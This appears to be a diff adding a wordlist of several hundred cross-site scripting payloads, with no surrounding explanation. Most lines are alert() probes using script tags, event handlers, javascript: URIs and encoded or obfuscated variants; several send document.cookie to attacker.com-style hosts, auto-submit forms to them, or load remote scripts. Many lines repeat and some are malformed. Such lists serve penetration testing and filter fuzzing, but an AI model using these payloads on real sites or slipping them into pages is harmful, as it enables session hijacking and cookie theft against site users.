@@ -1,0 +1,310 @@
+<script>alert('XSS');</script>
+<img src=x onerror=alert('XSS')>
+<<SCRIPT>alert('XSS');//<</SCRIPT>
+<img src=\"javascript:alert('XSS');\">
+<iframe src=\"javascript:alert('XSS');\"></iframe>
+<input type=\"text\" value=\"<script>alert('XSS')</script>\">
+<video poster=\"javascript:alert('XSS')\"><source src=\"#\"></video>
+<a href=\"javascript:alert('XSS');\">Click me</a>
+<button onclick=\"alert('XSS')\">Click me</button>
+<audio autoplay><source src=\"javascript:alert('XSS')\"></audio>
+<object data=\"javascript:alert('XSS')\"></object>
+<body background=\"javascript:alert('XSS')\"></body>
+<marquee onstart=\"alert('XSS')\">Scrolling text...</marquee>
+<input type=\"text\" value=\"&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;\">
+<xmp><script>alert('XSS');</script></xmp>
+<isindex action=\"javascript:alert('XSS');\">
+<embed src=\"javascript:alert('XSS');\"></embed>
+<textarea onfocus=alert('XSS') autofocus></textarea>
+<script>var a=prompt('Enter your name');alert('Hello '+a);</script>
+<img src=\"x\" onerror=\"prompt(1)\">
+<object type=\"text/x-scriptlet\" data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">
+<script>confirm(document.cookie)</script>
+<iframe srcdoc=\"&#x3C;svg onload=alert('XSS')&#x3E;\"></iframe>
+<img src=\"javascript:alert('XSS');\"/>
+<math><a xlink:href=\"javascript:alert('XSS')\">click</a></math>
+<body onload=\"alert('XSS')\"></body>
+<input pattern=\".*alert\(1\).*\">
+<a href=\"jAvAsCrIpT:alert(0)\">X</a>
+<script>a=/XSS/;</script><input type=\"text\" name=\"xss\" onfocus=\"this.value=a.source\"></script>
+<form action=\"javascript:alert('XSS')\"><input type=\"text\"></form>
+<!--<script>alert('XSS');</script>-->
+<img src=x oneonerrorrror=alert('XSS')>
+<IMG SRC=\"JaVaScRiPt:alert('XSS');\">
+<BODY BACKGROUND=\"javascript:alert('XSS')\">
+<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>
+<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">
+<DIV STYLE=\"width: expression(alert('XSS'));\">
+<TABLE BACKGROUND=\"javascript:alert('XSS')\">
+<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">
+<STYLE>@im\port'\ja\vasc\ript:alert(\"XSS\")';</STYLE>
+<BASE HREF=\"javascript:alert('XSS');//\">
+<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\"></OBJECT>
+<EMBED SRC=\"http://xss.rocks/xss.swf\" AllowScriptAccess='always'></EMBED>
+<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas]]><![CDATA[cript:alert('XSS');\">]]>
+<audio controls><source src onerror=alert(1)></audio>
+<form><input type=text name=username><input type=password name=password><input type=submit onclick=send()></form><script>function send(){alert(username.value+': '+password.value);}</script>
+<img src=x:x onerror=alert(0)>
+<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">Click me</a>
+<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+<!--[if gte IE 4]><SCRIPT>document.write('<SCR' + 'IPT>alert(\"XSS\")</SCR' + 'IPT>');</SCRIPT><![endif]-->
+<!--[if lt IE 7]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+<![><IMG SRC=\"javascript:alert('XSS');\">]>
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">
+<META HTTP-EQUIV=\"Link\" Content=\"<http://; REL=stylesheet>\"
+<STYLE>BODY{-moz-binding:url(\"http://xss.rocks/xssmoz.xml#xss\")}</STYLE>
+<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+<STYLE>BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>
+¼script¾alert(¢XSS¢)¼/script¾
+<SCRIPT/SRC=\"http://xss.rocks/xss.js\"></SCRIPT>
+<IMG SRC='vbscript:msgbox(\"XSS\")'>
+<STYLE>a{background:url(\"javascript:alert('XSS')\");}</STYLE>
+<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">
+<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>
+<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>
+<!--[if IE]><script>alert('XSS');</script><![endif]-->
+<a href=\"javascript:void(0)\" onclick=\"prompt(1)\">X</a>
+<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='></object>
+<applet code=\"javascript:alert('XSS')\"></applet>
+<meta property=\"og:image\" content=\"javascript:alert('XSS');\">
+<iframe srcdoc=\"&lt;img onerror=alert('XSS')&gt;\"></iframe>
+<img src=\"http://www.w3schools.com/images/w3schools_green.jpg\" onload=\"document.forms[0].submit()\">
+<marquee loop=1 width=0 onfinish=alert(1)>a</marquee>
+<script src=\"//xss.rocks/xss.js\"></script>
+<script>history.pushState('', '', '/malicious-page');</script>
+<input type=\"text\" name=\"test\" id=\"test\"><input type=\"button\" value=\"Test\" onclick=\"alert(document.getElementById('test').value)\">
+<script>$(function(){$('body').append('<div>').html('<img src=x:x onerror=alert(0)>')});</script>
+<svg/onload=alert('XSS')>
+<embed/src=javascript:alert(1)>
+<a href=javas&#99;ript:alert(1)>Click me</a>
+<img src=lol onerror=alert(1)></img>
+<p><a href=\"#\" onclick=\"alert('XSS')\">Click here</a></p>
+<script>new Function('alert(`XSS`)')()</script>
+<b/onclick=alert(1)>X</b>
+<audio autoplay=true src=\"javascript:alert(1)\"></audio>
+<input onfocus=alert(document.domain)>
+<style>@import url(javascript:alert('XSS'));</style>
+<video><source onerror=\"javascript:alert(1)\"></video>
+<marquee onstart='javascript:alert(1)'>
+<details/open/ontoggle=confirm('XSS')>
+<w s=''><w s=''><w s='' onload=this.parentNode.parentNode.parentNode.removeChild(this.parentNode.parentNode)></w></w></w>
+<meta charset=\"utf-7\"><script>alert('XSS')</script>
+<script>location.replace(\"javascript:alert('XSS')\")</script>
+<details/open ontoggle=alert(1)></details>
+<marquee scrollamount=0 loop=1><a href=//google.com>Click me</a></marquee>
+<audio controls><source src='data:audio/wav;base64,UklGRhSAAABXQVZFZm10IBAAAAABAAEAwF0AAIC7AAACABAAZGF0YQAAAAA==' onerror=alert(1)></audio>
+<datalist id=x><option onmouseover=alert(1)></datalist><input list=x>
+<p/dummy/style=content:url('javascript:alert(1)')></p><b>
+<math><semantics><mi>xss</mi><annotation encoding=\"application/x-tex\">\\text{<script>alert(1)</script>}</annotation></semantics></math>
+<base href=\"javascript://\" onclick=alert(1)// />
+<form id=test /><button form=test formaction=javascript:alert(1)>X</button></form>
+<math href=\"javascript:alert(1)\"><msub><mi>test</mi><script>prompt(1)</script></msub></math>
+<style/onload=&lt;!--&#09;&gt;&#10;alert(1)>
+<img src=\"/\" onerror=\"this.onerror=null;location='/test?cookie='+document.cookie;\">
+<iframe srcdoc='&lt;body onload=prompt(1)&gt;'></iframe>
+<textarea autofocus onfocusout=alert(1)>
+<svg/onload=setTimeout('alert(1)')>
+<picture><source srcset=\"fakeimage.jpg 1x, javascript:alert(1) 2x\"></picture>
+<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='></object>
+<form method=post id=test enctype=text/plain><input type=file form=test name=f><button form=test formaction=javascript:alert(f.value)>X</button></form>
+<button onclick=e=>{e.constructor.constructor('alert(1)')()}>X</button>
+<img src=. onerror=this.onerror=null;this.src='javascript:alert(1)'
+<script>crypto.subtle.digest('SHA-256', new TextEncoder().encode('alert(1)')).then(x=>alert(...new Uint8Array(x)))</script>
+<b><svg onload=alert(1)></b>
+<details open ontoggle=Function`‌${prompt``}``</style><a href=//example.com>X
+<body style=overflow-y:scroll><br><br><div style=height:999em;width:50px></div><script>document.body.scrollIntoView({behavior:'smooth',block:'end'});location.href='#foo'</script>
+<form><input type=submit accesskey=x onclick=eval(atob(this.accessKey)) accesskey=ZW5hYmxlZA==></form>
+<form><textarea pattern=^.{0,3}$ oninvalid=alert(1)>123</textarea><input type=submit></form>
+<iframe srcdoc=\"<img style='position:absolute;top:0;left:0' src=x onerror=alert(1)>\" width=100% height=100%></iframe>
+<script>({set/**/$($){_/**/setter=$,_=x=>({get $(/**/) {delete this.$;return $(_)}})(!0)})['$']='alert(1)'</script>\"
+<iframe srcdoc='&lt;body onload=this.previousElementSibling.click()&gt;&lt;a href=javascript:alert(1)&gt;X&lt;/a&gt;' id=x></iframe><button onclick=\"x.contentWindow.document.getElementById('x').click()\">X</button>
+<img srcset=x onerror=alert(1)><img srcset=x onerror=alert(2)>
+<style/onload=&lt;i/http://ha.ckers.org/.j&gt;
+<marquee/onstart=confirm(1)>/
+<meta content=`<svg/onload=alert(document.domain)>` http-equiv=refresh>
+<progress form=toast><datalist id=toast><option/onmousemove=`alert%26lpar;1&rpar;`></datalist></progress>
+<script>Object.defineProperty(navigator, 'userAgent', {get:function(){return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.42';}});</script><iframe srcdoc=\"<script>top.location='//attacker.com/log.php?cookie='+document.cookie;</script>\"></iframe>
+<input onblur=alert(1) autofocus><input autofocus>
+<embed code='http://businessinfo.co.uk/labs/xss.swf'></embed>
+<marquee><img src=x onerror=confirm(1)></marquee>
+<style>@import'http://attacker/xss.css';</style>
+<meta http-equiv=refresh content='0;/#;/#;/#;/#;/#;/#;/#;/#;/#;/#;/#;/#;/#;/#;/#;/#;/#;/#;/#;/https://attacker/?xss=1'>
+<object type='text/x-scriptlet' data='http://hacker/malicous.sct'></object>
+<img src=# onerror=\"window.location.href='http://attacker/?cookie='+document.cookie;\">
+<button onclick=\"var i=document.createElement('iframe');i.src='http://attacker/log.php?cookie='+document.cookie;document.body.appendChild(i);\">Click me</button>
+<base href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4KPHA+PHN0cm9uZz5WT0lDSEFSIDogYWxlcnQoMSk8L3N0cm9uZz48L3A+\">
+<form><input type=button value='Button' onClick=\"javascript:alert('XSS')\"></form>
+<img src='/images/test.png' onmouseover=\"document.write('<img src=x:x onerror=alert(1)>')\">
+<body onload=\"document.forms[0].submit()\"><form action='http://attacker.com' method='post'><input type='hidden' name='data' value=''><input type='submit' value='Submit'></form></body>
+<script>history.pushState('', '', '/xss');</script>
+<!--[if gte IE 4]>\n<style>.test{background-image:url(\"javascript:alert('XSS')\");}</style>\n<![endif]-->
+<a href=\"javascript:alert(document.cookie)\">Click me</a>
+<iframe src='javascript:alert(1)'/>
+<img src=x:alert(alt) alt=‘>”><img src=x onerror=alert(alt)>
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+<body onscroll=alert(1)><br><br><br>...<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<meta http-equiv=\"refresh\" content=\"0;URL='javascript:alert(1)'\">
+<a tabindex=\"1\"><a href=\"javascript:alert(document.cookie)\">Click me</a></a>
+<audio src onerror=this.onerror=alert(1)>
+<video src/onerror=alert(1)//>
+<html manifest=//attacker.com/xss.manifest><script>alert(1);</script></html>
+<form /./;/\x00action=\x22\x22;/./;/\x00method=post><input type=file name=/./;/\x00value=x><input type=submit></form>
+<img src='vbscript:msgbox(\"XSS\")'>
+<svg/onload=alert(1)>
+<img src=x onerror=\"alert(String.fromCharCode(88,83,83)))\">
+<script>({0:#0=eval,#0#(window.name)})();</script>
+<a href=\"javascript:alert(/XSS/.source)\">Click me</a>
+<link rel='stylesheet' href='javascript:alert(1)' type='text/css'>
+<body onload=alert(1)><iframe srcdoc='<html></html>'></iframe>
+<input type=text pattern=(?i)(answer1|answer2|answer3) oninvalid=alert(1)><input type=submit>
+<form action=JavaScript:alert(1)><input type=submit></form>
+<meta charset=\"utf-7\">+ADw-SCRIPT+AD4-alert(document.cookie)+ADw-/SCRIPT+AD4-
+<form><input type=file value=test.jpg onclick=alert(1)></form>
+<iframe srcdoc='&lt;svg onload=alert(1)&gt;'></iframe>
+<img src=x:x onerror=alert(document.domain)>
+<iframe src='data:text/html,<script>alert(1)</script>'></iframe>
+<span style='background-image:url(javascript:alert(1))'>Test</span>
+<style>@import 'http://attacker/xss.css';</style>
+<iframe/onreadystatechange=(alert)(1)
+<script>Object.setPrototypeOf(document.createElement('img'), new Image().constructor.prototype);document.createElement('img').src='javascript:alert(1)'</script>
+<img srcset=\"x 1x, 1);alert(1)//\">
+<object type='image/svg+xml' data='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8IS0tIEdlbmVyYXRvciBJIHdhcyBhIG1lc3NhZ2UgLS0+PC9zdmc+Cg=='></object>
+<iframe src=\"http://www.google.com\" style=\"%22position:absolute;top:0;left:0;width:100%;height:100%;z-index:-999%22\" tabindex=\"-1\"></iframe><script>alert(1)</script>
+<form><input name=hello></form><button formaction=\"javascript:alert(document.forms[0].hello.value)\">X</button>
+<img src=`xx:xx` onload=\"eval('\x61\x6c\x65\x72\x74\x28\x31\x29')\"></img>
+<iframe srcdoc='<style>::-webkit-scrollbar{width:0px;height:0px}.f{padding:999em}</style><div class=f></div><script>alert(1)</script>'></iframe>
+<script>self['\x75\x6e\x65\x73\x63\x61\x70\x65'](self['\x61\x74\x6f\x62']('\x61\x6c\x65\x72\x74\x28\x31\x29'))</script>
+<style>@import'http://attacker/xss.css'</style>
+<param name=\"movie\" value=\"http://businessinfo.co.uk/labs/xss.swf\"><param name=\"allowFullScreen\" value=\"true\"><param name=\"FlashVars\" value=\"&xml=javascript:alert(1)\">
+<img src=`xx:xx` onerror='throw /test/'></img>
+<a href='javascript:window.alert(document.cookie)'>Click me</a>
+<meter value=\"\" min=\"-42\" max=\"42\" onmouseover=\"alert(foo);\"></meter><script>var foo='XSS';</script>
+<form><input name=x><input type=button value='Button' onClick=\"eval(x.value)\"></form>
+<script>({0:#0=alert,#0#&#039;XSS&#039;})();</script>
+<img srcset=\"x\" onerror=\"javascript:alert(1)\">
+<svg id=test onload=alert(1)></svg>
+<video><source onerror=\"alert(1)\"></video>
+<marquee loop=1 width=0 onfinish=alert(1)></marquee>
+<img src=`xx:xx` onerror='throw /test/'></img>
+<a href='javascript:window.alert(document.cookie)'>Click me</a>
+<meter value=\"\" min=\"-42\" max=\"42\" onmouseover=\"alert(foo);\"></meter><script>var foo='XSS';</script>
+<form><input name=x><input type=button value='Button' onClick=\"eval(x.value)\"></form>
+<script>({0:#0=alert,#0#&#039;XSS&#039;})();</script>
+<img srcset=\"x\" onerror=\"javascript:alert(1)\">
+<svg id=test onload=alert(1)></svg>
+<video><source onerror=\"alert(1)\"></video>
+<marquee loop=1 width=0 onfinish=alert(1)></marquee>
+<style/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+<embed src=http://www.youtube.com/v/12345678&autoplay=1>
+<details/open/ontoggle=alert(1)>Test</details>
+<audio autoplay><source src=\"data:audio/mpeg;base64,//5hAAAAAAAAAAAAAAAAPb/AAD4QBVgZGF0YS11cGxvYWQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASAAAAABVSyEiCgpcClVJRDogICAgICAgICA2YzRkOWI3MjgxZTQwNTU2NzUzMjI1NDEyNWYwZTllYjM3NGJmOGUzZGQKICAgICAgICA8aW5wdXQgdHlwZT0idGV4dC9wbGFpbjtiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVWkZvQUFBQT09IiB2YWx1ZT0iVUUwSjRQbm1nMkJWcHJZRUFBQUFMTGRka3hUV0RRbFplRTVZNklOYlk2bE5UMWxNV2t0d0tudG9DZkJLWUEiPgo="></audio>
+<script>new Function`alert\x28document.domain\x29``</script>
+<form><button formaction=\"javascript:alert(1)\">X</button></form>
+<textarea autofocus onfocus=alert(1)>Test</textarea>
+<input type=image src onerror=\"alert(1)\"></input>
+<video><source onerror=\"window.location.href='http://attacker.com/?cookie='+document.cookie\"></video>
+<style/onload=&lt;!--&#09;&gt;&#10;alert(1)
+<svg xmlns='http://www.w3.org/2000/svg' onload='javascript:alert(1);' />
+<details/open/ontoggle=alert(1)>Test</details>
+<div style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onclick=\"prompt(1)\"></div>
+<img src=x:x onerror=\"confirm(1)\">
+<iframe srcdoc='<svg/onload=alert(1)>'></iframe>
+<script>new Function`alert\x28document.domain\x29``</script>
+<form><button formaction=\"javascript:alert(1)\">X</button></form>
+<textarea autofocus onfocus=alert(1)>Test</textarea>
+<input type=image src onerror=\"alert(1)\"></input>
+<video><source onerror=\"window.location.href='http://attacker.com/?cookie='+document.cookie\"></video>
+<style/onload=&lt;!--&#09;&gt;&#10;alert(1)
+<svg xmlns='http://www.w3.org/2000/svg' onload='javascript:alert(1);' />
+<details/open ontoggle=true  ontoggle=alert(1) >Test</details>
+<div style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onclick=\"prompt(1)\"></div>
+<img src=x:x onerror=\"confirm(1)\">
+<details/open ontoggle=true  ontoggle=alert(1) >Test</details>
+<div style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onclick=\"prompt(1)\"></div>
+<img src=x:x onerror=\"confirm(1)\">
+<iframe srcdoc='<svg/onload=alert(1)>'></iframe>
+<script>name='';setTimeout(\"location.hash='XSS'\",100);</script><a href='#' onmouseover=alert(document.location+document.cookie)>XSS</a>
+<object type=\"text/x-scriptlet\" data=\"http://businessinfo.co.uk/labs/xss.sct\"></object>
+<a href='javascript:void(0)' onmouseover=\"document.getElementsByTagName('body')[0].innerHTML = '<form method=post action=http://attacker.com/ name=f><input name=d type=text value='+document.cookie+'><\/form>';document.forms[0].submit()\">XSS</a>
+<img src=x onerror='fetch(`http://localhost:1337/?cookie=${document.cookie}`)'>
+<style>@import'http://attacker/xss.css';</style>
+<!--<script>alert(1)</script>--!>
+<isindex action=\"javascript:alert(1)\">
+<b:<%=alert(1)%>>
+<iframe src=javascript:alert(1)></iframe>
+<input autocomplete=off id=confirmPassword name=confirmPassword type=password><script>document.getElementById('confirmPassword').autocomplete = 'on';</script>
+<a/href=\"javascript&colon;alert(1)\">click
+<embed src=\"http://businessinfo.co.uk/labs/xss.swf\" AllowScriptAccess=\"always\"><param name=\"FlashVars\" value=\"&xml=<x></x><img src=1 onerror=alert(1)//\"></embed>
+<a href=\"javascript:window.onerror=alert;throw'%3C%252Ftitle%253E%253Cscript%253Ealert(1)%253C%252Fscript%253E'\">Link</a>
+<input type=\"submit\" formaction=\"javascript:alert(1)\"></form>
+<html onmouseover=\"document.createElement('iframe').src='http://attacker.com/?cookie='+document.cookie;\"></html>
+<b <i<script>alert(1)</script>]>hello</b>
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<div style=\"background-image:url(javascript:alert(document.cookie))\">Test</div>
+<input type=\"text\" value=\"`><img src=x:x onerror=alert(document.domain)>\"><input type=\"submit\">
+<a href=\"data:text/html,<script>alert(1)</script>\">Click</a>
+<object data=\"data:application/x-java-applet;base64,cG9ydCA9IGV2YWwoJFAuMTYpOw==\"></object>
+<script>crypto.subtle.digest('SHA-256', new TextEncoder().encode('XSS'))</script>
+<script src=data:,alert(1)></script>
+<marquee loop=1 width=0 onfinish=alert(1)>Test</marquee>
+<table background='javascript:alert(document.cookie);'></table>
+<math><mtext>&#x0003C;script&#x0003E;alert(1)&#x0003C;/script&#x0003E;</mtext></math>
+<input type=\"submit\" formaction=\"javascript:alert(1)\"></form>
+<html onmouseover=location=`javascript:alert(1)`>
+<SCRIPT SRC=\"http://attacker/xss.js\"></SCRIPT>
+<!--<img src=xxx:x onerror=eval(src)>. -->
+<button onclick=\"alert(String.fromCharCode(88,83,83))\">X</button>
+<img src='http://www.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50?s=2048&d=http://attacker.com/onerror=alert(document.cookie);'></img>
+<audio oncanplaythrough=alert(1)>Test</audio>
+<embed src=\"java\rscript:alert(1)\" type=\"video/mp4\"><noembed><img src=x onerror=prompt(1);></noembed></embed>
+<embed src=\"java\rscript:alert(1)\" type=\"video/mp4\"><noembed><img src=x onerror=prompt(1);></noembed></embed>
+<div style=\"-webkit-transform: translateX(-9999px); width: 30em; height: 10em; overflow: scroll; position: absolute;\"><img src=\"http://attacker.com/\" onload=\"window.location='https://attacker.com/log?key='+document.cookie;\" /></div>
+<div style=\"position:fixed;top:0;left:0;width:100%;height:100%\"><a href=\"javascript:alert(1)\">Test</a></div>
+<input id=confirmPassword autocomplete=\"new-password\" name=confirmPassword type=password><script>document.getElementById('confirmPassword').autocomplete = 'on';</script>
+<audio controls src=x onerror=\"document.write(document.cookie)\"></audio>
+<form method=\"POST\" action=\"url\"><input type=\"text\" name=\"field1\"/><input type=\"submit\" value=\"Submit\"></form><iframe name=\"myIframe\"></iframe><script>window.frames[myIframe].location=\"javascript:alert('XSS')\";</script>
+<img src=\"//www.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50?s=2048&d=http://attacker.com/onerror=alert(document.cookie);\"></img>
+<img src=\"x:` `<script>alert(1)</script>.gif\"/>
+<style onload=\"alert(document.domain);\">
+<font color=\"\"><script>alert(1)</script></font>
+<div style=\"background-image:url(javascript:alert(1))\">Test</div>
+<style>@im\\port'\\ja\\vasc\\ript:alert(1)';</style>
+<body onscroll=alert(document.cookie)>
+<SCRIPT SRC=http://attacker/xss.js></SCRIPT>
+<img src=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCI+CjxyZWN0IHdpZHRoPSIxMjgiIGhlaWdodD0iMTI4IiBmaWxsPSJibGFjayIgLz4KPC9zdmc+\" />
+<script>document.write('&lt;scr' + 'ipt type=\"text/javascript\" src=\"http://attacker.com/xss.js\"&gt;&lt;/scr' + 'ipt&gt;');</script>
+<marquee loop=1 width=0 onfinish=alert(1)>Test</marquee>
+<object data=\"javascript:alert(1)\"></object>
+<table background='javascript:alert(document.cookie);'></table>
+<meta http-equiv=\"refresh\" content=\"0; url=javascript:alert(1);\">
+<!--><IFRAME SRC=\"javascript:alert(String.fromCharCode(88,83,83))\"></IFRAME>
+<a href=\"javascript:void(0)\" onclick=\"document.getElementsByClassName('test')[0].innerHTML = '<iframe src=http://attacker.com/onload=alert(document.cookie)></iframe>'\">XSS</a><div class=\"test\"></div>
+<math><mtext>&#x0003C;script&#x0003E;alert(1)&#x0003C;/script&#x0003E;</mtext></math>
+<img src='http://www.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50?s=2048&d=http://attacker.com/onerror=alert(document.cookie);'></img>
+<div style=\"position:fixed;top:0;left:0;width:100%;height:100%\"><a href=\"javascript:alert(1)\">Test</a></div>
+<input id=confirmPassword autocomplete=\"new-password\" name=confirmPassword type=password><script>document.getElementById('confirmPassword').autocomplete = 'on';</script>
+<audio controls src=x onerror=\"document.write(document.cookie)\"></audio>
+<iframe name=\"myIframe\"></iframe><script>window.frames[myIframe].location=\"javascript:alert('XSS')\";</script>
+<img src=\"//www.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50?s=2048&d=http://attacker.com/onerror=alert(document.cookie);\"></img>
+<img src=\"x:` `<script>alert(1)</script>.gif\"/>
+<style onload=\"alert(document.domain);\">
+<font color=\"\"><script>alert(1)</script></font>
+<div style=\"background-image:url(javascript:alert(1))\">Test</div>
+<style>@im\\port'\\ja\\vasc\\ript:alert(1)';</style>
+<body onscroll=alert(document.cookie)>
+<SCRIPT SRC=http://attacker/xss.js></SCRIPT>
+<img src=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCI+CjxyZWN0IHdpZHRoPSIxMjgiIGhlaWdodD0iMTI4IiBmaWxsPSJibGFjayIgLz4KPC9zdmc+\" />
+<script>document.write('&lt;scr' + 'ipt type=\"text/javascript\" src=\"http://attacker.com/xss.js\"&gt;&lt;/scr' + 'ipt&gt;');</script>
+<marquee loop=1 width=0 onfinish=alert(1)>Test</marquee>
+<object data=\"javascript:alert(1)\"></object>
+<table background='javascript:alert(document.cookie);'></table>
+<meta http-equiv=\"refresh\" content=\"0; url=javascript:alert(1);\">
+<!--><IFRAME SRC=\"javascript:alert(String.fromCharCode(88,83,83))\"></IFRAME>
+<a href=\"javascript:void(0)\" onclick=\"document.getElementsByClassName('test')[0].innerHTML = '<iframe src=http://attacker.com/onload=alert(document.cookie)></iframe>'\">XSS</a><div class=\"test\"></div>
+<a href=\"http://attacker.com\" style=\"position:absolute;top:0;left:0;width:100%;height:100%;z-index:99999;\"></a>
+<img src=\"http://attacker.com/\" onload=\"window.location='https://attacker.com/log?key='+document.cookie;\" />
+<img src=\"/\" onerror=\"javascript:alert(1)\">
+<input type=\"text\" value=\"xss\" /><button onclick=\"eval($('input').val())\">run</button>
+<script>history.pushState('', '', '/');history.pushState('', '', '/about');</script><iframe src=\"javascript:alert(1)\"></iframe>
+<script>new Function(atob('YWxlcnQoJ2FjdGl2YXRlZCcp'))();</script>
